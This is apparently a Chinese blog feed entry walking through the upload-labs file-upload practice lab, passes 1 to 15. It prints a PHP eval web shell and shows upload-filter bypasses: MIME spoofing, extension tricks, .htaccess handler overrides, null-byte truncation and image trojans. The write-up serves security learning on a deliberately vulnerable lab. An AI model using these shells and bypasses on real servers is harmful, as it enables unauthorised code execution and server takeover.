{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"文件上传靶场\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "upload-labs基础关卡",
            "date_published": "2020-11-25T13:24:52.000Z",
            "content_html": "<h1 id=\"pass-01\"><a class=\"markdownIt-Anchor\" href=\"#pass-01\">#</a> Pass-01</h1>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>第一关，通常随便传把哈哈哈</p>\n<p>来个 php 一句话</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hqxx&#x27;</span>]);    </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>哦豁，弹窗提示了：该文件不允许上传，请上传.jpg|.png|.gif 类型的文件，当前文件类型为：.php</p>\n<p>弹窗提示，没有发请求包，说明是前端验证了，那就去找 js 验证代码，干掉他</p>\n<p><img src=\"upload-labs-01-01.png\" alt=\"\"></p>\n<p>方法 1：Ctrl+F 找哪个标签用了这个函数，删掉它，然后点击上传</p>\n<p><img src=\"upload-labs-01-02.png\" alt=\"\"></p>\n<p>方法 2：复制 checkFile 函数，将.php 类型加进白名单，在控制台输入运行后点击上传</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function checkFile() &#123;</span><br><span class=\"line\">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class=\"line\">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class=\"line\">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //定义允许上传的文件类型</span><br><span class=\"line\">    var allow_ext = &quot;.jpg|.png|.gif|.php&quot;;</span><br><span class=\"line\">    //提取上传文件的类型</span><br><span class=\"line\">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">    //判断上传文件类型是否允许上传</span><br><span class=\"line\">    if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class=\"line\">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">        alert(errMsg);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上传后通过查看器得到文件路径</p>\n<p><img src=\"upload-labs-01-03.png\" alt=\"\"></p>\n<p>上菜刀</p>\n<p>菜刀没上去，上蚁剑</p>\n<p><img src=\"upload-labs-01-04.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-01-05.png\" alt=\"\"></p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>在控台运行函数的方法，我还是一个月之前才知道的（别说 de），明明很容易想到或者尝试到的点…</p>\n<p>感觉还是要脑洞大一点，多尝试一些</p>\n<h1 id=\"pass-02\"><a class=\"markdownIt-Anchor\" href=\"#pass-02\">#</a> Pass-02</h1>\n<p>date：2020-11-25 22:01:47</p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h2>\n<p>通过查看器，找到前端的 onsubmit 事件，但是删除后，还是判定文件类型不正确</p>\n<p><img src=\"upload-labs-02-01.png\" alt=\"\"></p>\n<p>并没有在前端看见 js 代码，应该是后台判断了</p>\n<p>看一下提示：本 pass 在服务端对数据包的 MIME 进行检查！</p>\n<p>上传文件，bp 抓包，更改 MIME 类型为 image/png，同时得到路径</p>\n<p><img src=\"upload-labs-02-02.png\" alt=\"\"></p>\n<p>上蚁剑连接即可。</p>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>真百度了好多次了，每次都忘记</p>\n<p>“MIME 的全称是 Multipurpose Internet Mail Extensions, 即多用途互联网邮件扩展类型。 这是 HTTP 协议中用来定义文档性质及格式的标准。</p>\n<table>\n<thead>\n<tr>\n<th>文件类型</th>\n<th>后缀</th>\n<th>数据包中的文件类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>超文本标记语言文本</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml 文档</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>普通文本文档</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF 文本</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF 文档</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word 文件</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG 图像</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF 图形</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG 图形</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>任意的二进制数据</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"pass-03\"><a class=\"markdownIt-Anchor\" href=\"#pass-03\">#</a> Pass-03</h1>\n<p>date：2020-11-25 22:53:30</p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h2>\n<p>不废话直接传 php 上爆破抓包，send to repeater</p>\n<p><img src=\"upload-labs-02-03.png\" alt=\"\"></p>\n<p>根据上传 php 文件后的提示，非常有理由认为后台设置了后缀的黑名单</p>\n<p>大小写绕过，没绕过去，空格绕过去了但是不解析，那既然是黑名单，就把后缀改成 php4 呗</p>\n<p><img src=\"upload-labs-03-01.png\" alt=\"\"></p>\n<p>上蚁剑连接的时候，脚本改成 php4 类型的就可以了</p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p>据说，空格可以那啥，windows 会忽略空格和点，可是我上传成功不能解析</p>\n<p>然后 00 截断上传，右键看源代码是我的一句话，后来查了一下截断上传的条件：</p>\n<ol>\n<li>php 版本小于 5.3.29</li>\n<li>magic_quotes_gpc = Off</li>\n</ol>\n<p>唉</p>\n<h1 id=\"pass-04\"><a class=\"markdownIt-Anchor\" href=\"#pass-04\">#</a> Pass-04</h1>\n<p>date：2020-11-25 23:03:25</p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h2>\n<p>提示：</p>\n<p>本 pass 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 后缀文件！</p>\n<p>看了下源码空格大小写啥的，都被弄了</p>\n<p>但是没有过滤.htaccess 后缀</p>\n<p>要启用.htaccess，要更改 httpd.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AllowOverride None </span><br><span class=\"line\">更改为：AllowOverride All</span><br></pre></td></tr></table></figure>\n<p><img src=\"upload-labs-04-01.png\" alt=\"\"></p>\n<p>去掉框住这行的注释符号</p>\n<p><img src=\"upload-labs-04-02.png\" alt=\"\"></p>\n<p>上传.htaccess，所有文件都会解析为 php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n<p>然后上传 hqxx.png 图片马</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo(); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>题目也给了路径了，地址栏直接输入就行</p>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>我最后也没把.png 解析 php 成功</p>\n<p>在.htaccess 里面随便输错误字符，报 500，去看 apache 的日志说我输入的错误字符不对，说明我上传的.htaccess 文件是被解析了的</p>\n<p>把 httpd.conf 里面所有的 AllowOverride None 都改成了 AllowOverride All，重写模块也开了，文件路径也没有问题，php 版本也调低了，phpstudy 也重启了，但永远就是这样：</p>\n<p><img src=\"upload-labs-04-03.png\" alt=\"\"></p>\n<p>我觉得应该还是配置文件的问题，可是到底是哪里出了问题啊！！！</p>\n<p>而后修改 htaccess 为，把文件名包含 hqxx 的文件全部以 php 解析:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;hqxx&quot; &gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p>发现 a.php 可以解析成功，而 hqxx.php 不能解析，我真真真呵呵了</p>\n<p>找了好久终于发现有一个人和我一样的问题了，哭唧唧</p>\n<p><a href=\"https://www.zhaosimeng.cn/zqzb/55.html\">谢谢大哥</a></p>\n<p>在新版中 php 环境默认都是带 nts 的，而在旧版本中则可以选择不带，选一个不带 nts 的 php 版本就可以正常玩了，但是我的 phpstudy 里的 php 全是带 nts 的，谢谢您了</p>\n<ol>\n<li>\n<p><strong>.htaccess 上传漏洞</strong></p>\n<p>漏洞形成条件</p>\n<ul>\n<li>apache 服务器</li>\n<li>能够上传.htaccess 文件，一般为黑名单限制。</li>\n<li>AllowOverride All，默认配置为关闭 None。</li>\n<li>LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</li>\n<li>上传目录具有可执行权限。</li>\n</ul>\n</li>\n<li>\n<p>.htaccess 文件 (或者 &quot;分布式配置文件&quot;）, 全称是 Hypertext Access (超文本入口)。</p>\n<p>概述来说，htaccess 文件是<a href=\"https://baike.baidu.com/item/Apache\"> Apache</a> 服务器中的一个配置文件，它负责相关目录下的网页配置。</p>\n<p>启用.htaccess，需要修改 httpd.conf，启用 AllowOverride，并可以用 AllowOverride 限制特定命令的使用。</p>\n<p>.htaccess 的主要作用就是实现 url 改写，也就是当浏览器通过 url 访问到服务器某个文件夹时，作为主人，我们可以来接待这个 url，具体地怎样接待它，就是此文件的作用。</p>\n<p><a href=\"https://www.cnblogs.com/gyrgyr/p/10773118.html\">.htaccess 使用方法介绍</a></p>\n</li>\n</ol>\n<h1 id=\"pass-05\"><a class=\"markdownIt-Anchor\" href=\"#pass-05\">#</a> Pass-05</h1>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h2>\n<p>看源码，已经不让上传.htaccess 了，但是这次没有把后缀名全转成小写了，也就是说嘿嘿嘿</p>\n<p>上传 hqxx.phP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>\n<p>上传成功，地址栏直接输入路径</p>\n<p><img src=\"upload-labs-05-01.png\" alt=\"\"></p>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结</h2>\n<p>我把 apache 玩崩了，重装都不行，换了 Nginx 哈哈哈</p>\n<p>顺便查了下 nginx 用 htaccess 的方法，<a href=\"https://blog.csdn.net/cs729298/article/details/77478155\">想看点我</a></p>\n<h1 id=\"pass-06\"><a class=\"markdownIt-Anchor\" href=\"#pass-06\">#</a> Pass-06</h1>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h2>\n<p>看源码，依然是黑名单</p>\n<p>并且将后缀名全部转换为小写了，但是空格啥的没去除了</p>\n<p>在文件名末尾加一个空格上传</p>\n<p><img src=\"upload-labs-06-01.png\" alt=\"\"></p>\n<p>解析成功</p>\n<p><img src=\"upload-labs-06-02.png\" alt=\"\"></p>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结</h2>\n<p>利用 Windows 特性 在 Windows 中文件后缀名末尾有空格会自动去掉</p>\n<h1 id=\"pass-07\"><a class=\"markdownIt-Anchor\" href=\"#pass-07\">#</a> Pass-07</h1>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h2>\n<p>看源码，转换了大小写，去除了首位空格</p>\n<p>那就在文件末尾加。呗</p>\n<p>上传成功，解析成功</p>\n<p><img src=\"upload-labs-07-01.png\" alt=\"\"></p>\n<h2 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结</h2>\n<p>下一题</p>\n<h1 id=\"pass-08\"><a class=\"markdownIt-Anchor\" href=\"#pass-08\">#</a> Pass-08</h1>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h2>\n<p>上传 hqxx.php::DATA</p>\n<p><img src=\"upload-labs-08-01.png\" alt=\"\"></p>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结</h2>\n<p>利用 windows 特性：</p>\n<p>必须是 windows, 必须是 php, 必须是那个源文件<br>\n php 在 window 的时候如果文件名后加上 &quot;::$DATA&quot;</p>\n<p>会把 &quot;::$DATA&quot; 之后的数据当成文件流处理，不会检测后缀名</p>\n<p>且保持 &quot;::$DATA&quot; 之前的文件名</p>\n<p>他的目的就是不检查后缀名</p>\n<p>改源代码测试了一下，其实和。空格是一样的，就是利用 windows 特性绕过黑名单，上传到文件夹时，文件后面的 &quot;::DATA…&quot; 已经被去掉了</p>\n<h1 id=\"pass-09\"><a class=\"markdownIt-Anchor\" href=\"#pass-09\">#</a> Pass-09</h1>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h2>\n<p>看提示：本 pass 只允许上传.jpg|.png|.gif 后缀的文件！</p>\n<p>看了源码发现，你这个骗子，明明还是黑名单，下次不看提示了</p>\n<p>看源码：先删除了末尾的点，然后去掉了::$DATA，后缀转成了小写，最后去除首尾空格</p>\n<p>那就 hqxx.php. .</p>\n<p>这样最后在末尾就留下了一个点，上传成功</p>\n<p><img src=\"upload-labs-09-01.png\" alt=\"\"></p>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结</h2>\n<p>跟着代码逻辑走～，可是黑盒都看不到源代码唉</p>\n<h1 id=\"pass-10\"><a class=\"markdownIt-Anchor\" href=\"#pass-10\">#</a> Pass-10</h1>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h2>\n<p>哈哈哈，源代码注释没了</p>\n<p>先去除文件名中的所有空格，再把文件名中所有在黑名单中存在的字符置空</p>\n<p>那么就，双写，成功绕过</p>\n<p><img src=\"upload-labs-10-01.png\" alt=\"\"></p>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结</h2>\n<p>下一题</p>\n<h1 id=\"pass-11\"><a class=\"markdownIt-Anchor\" href=\"#pass-11\">#</a> Pass-11</h1>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h2>\n<p>观摩源代码，发现是白名单，允许的类型有’jpg’,‘png’,‘gif’，而且还给文件重命名了</p>\n<p>上传 php 抓包发现 save_path=…/upload</p>\n<p>源码中文件保存路径就是 $img_path = <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>p</mi></msub><mi>a</mi><mi>t</mi><msup><mi>h</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo stretchy=\"false\">(</mo><mn>10</mn><mo separator=\"true\">,</mo><mn>99</mn><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi>d</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo stretchy=\"false\">(</mo><mi mathvariant=\"normal\">&quot;</mi><mi>Y</mi><mi>m</mi><mi>d</mi><mi>H</mi><mi>i</mi><mi>s</mi><mi mathvariant=\"normal\">&quot;</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">&quot;</mi><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.038em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">G</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">/</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mopen\">(</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">&quot;</span><span class=\"mclose\">)</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span><span class=\"mord\">&quot;</span><span class=\"mord\">.</span></span></span></span>file_ext;</p>\n<p>用 00 截断，在路径后面加上 hqxx.php%00</p>\n<p><img src=\"upload-labs-11-01.png\" alt=\"\"></p>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结</h2>\n<p>通过字符拼接，连接路径文件名，后台处理后上传到 windows 时，os 看见 %00 自动截断</p>\n<p>00 截断的前提条件：PHP 版本小于 5.3.4，PHP 的 magic_quotes_gpc 为 OFF 状态</p>\n<p>move_uploaded_file 函数的底层实现类似于 C 语言，遇到 0x00 会截断</p>\n<h1 id=\"pass-12\"><a class=\"markdownIt-Anchor\" href=\"#pass-12\">#</a> Pass-12</h1>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程</h2>\n<p>上传文件抓包，发现路径也在表单中了，在后面加上 /hqxx.php ，注意后面有一个空格</p>\n<p><img src=\"upload-labs-12-01.png\" alt=\"\"></p>\n<p>因为 post 请求没办法解析 %00，所以我们在 hex 中更改数据包</p>\n<p>找到对应行，代表空格的 20，改为 00</p>\n<p><img src=\"upload-labs-12-02.png\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img src=\"upload-labs-12-03.png\" alt=\"\"></p>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结</h2>\n<p>为啥网上有人说这是二进制代码，可是这明明不是二进制啊</p>\n<p>通常 JPEG/JPG: FF D8 , PNG:89 50，GIF:47 49</p>\n<ol>\n<li>JPEG;.JPE;.JPG，”JPGGraphic File”</li>\n<li>gif，”GIF 89A”</li>\n<li>zip，”Zip Compressed”</li>\n<li>doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>\n</ol>\n<h1 id=\"pass-13\"><a class=\"markdownIt-Anchor\" href=\"#pass-13\">#</a> Pass-13</h1>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程</h2>\n<p>源代码中读取文件前 2 字节，来判断文件类型是否属于 jpg、png 或者 gif 类型</p>\n<p>类型判断成功后，还更改了文件名</p>\n<p><img src=\"upload-labs-13-01.png\" alt=\"\"></p>\n<p>这里用文件包含来解析图片马</p>\n<p>手动在 upload 文件夹添加一个文件包含的 php</p>\n<p><img src=\"upload-labs-13-02.png\" alt=\"\"></p>\n<p>然后浏览器解析</p>\n<p><img src=\"upload-labs-13-03.png\" alt=\"\"></p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结</h2>\n<p>unpack () 函数从二进制字符串对数据进行解包。</p>\n<p>也就是说本身没有文件包含漏洞的话这个图片马是没有办法解析的，唉</p>\n<h1 id=\"pass-14\"><a class=\"markdownIt-Anchor\" href=\"#pass-14\">#</a> Pass-14</h1>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程</h2>\n<p>看源码，换了一种方式验证类型</p>\n<p>getimagesize () 这个函数功能会对目标文件的 16 进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</p>\n<p>所以还是伪造一个头部信息，上传图片马</p>\n<p><img src=\"upload-labs-14-01.png\" alt=\"\"></p>\n<p>图片马的利用可以结合文件包含，解析漏洞等… 反正就是要把他用 php 解析嘛</p>\n<p>比如，<a href=\"https://www.cnblogs.com/renhaoblog/p/12874603.html\">nginx 解析漏洞</a>，和版本无关，属于用户配置不当产生的</p>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结</h2>\n<p><a href=\"https://www.runoob.com/php/php-getimagesize.html\">菜鸟教程</a></p>\n<p>getimagesize () 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p>\n<p>实例 1：本地图片文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">list($width, $height, $type, $attr) = getimagesize(&quot;runoob-logo.png&quot;);</span><br><span class=\"line\">echo &quot;宽度为：&quot; . $width;</span><br><span class=\"line\">echo &quot;高度为：&quot; . $height;</span><br><span class=\"line\">echo &quot;类型为：&quot; . $attr;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>以上实例输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">宽度为：290高度为：69类型为：3属性：width=&quot;290&quot; height=&quot;69&quot;</span><br></pre></td></tr></table></figure>\n<p>实例 2：远程图片文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$remote_png_url = &#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&#x27;;$img_data = getimagesize($remote_png_url);print_r($img_data );?&gt;</span><br></pre></td></tr></table></figure>\n<p>以上实例输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array(    [0] =&gt; 290    [1] =&gt; 69    [2] =&gt; 3    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;    [bits] =&gt; 8    [mime] =&gt; image/png)</span><br></pre></td></tr></table></figure>\n<p>返回结果说明</p>\n<ul>\n<li>索引 0 给出的是图像宽度的像素值</li>\n<li>索引 1 给出的是图像高度的像素值</li>\n<li>索引 2 给出的是图像的类型，返回的是数字，其中 1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 =  BMP，7 = TIFF (intel byte order)，8 = TIFF (motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>\n<li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</li>\n<li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>\n<li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>\n<li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header (“Content-type: image/jpeg”);</li>\n</ul>\n<h1 id=\"pass-15\"><a class=\"markdownIt-Anchor\" href=\"#pass-15\">#</a> Pass-15</h1>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程</h2>\n<p>使用 exif_imagetype () 检查是否为图片文件</p>\n<p>用图片马进行绕过</p>\n<p><img src=\"upload-labs-15-01.png\" alt=\"\"></p>\n<p>但是还得帮 php 安装 exif.so 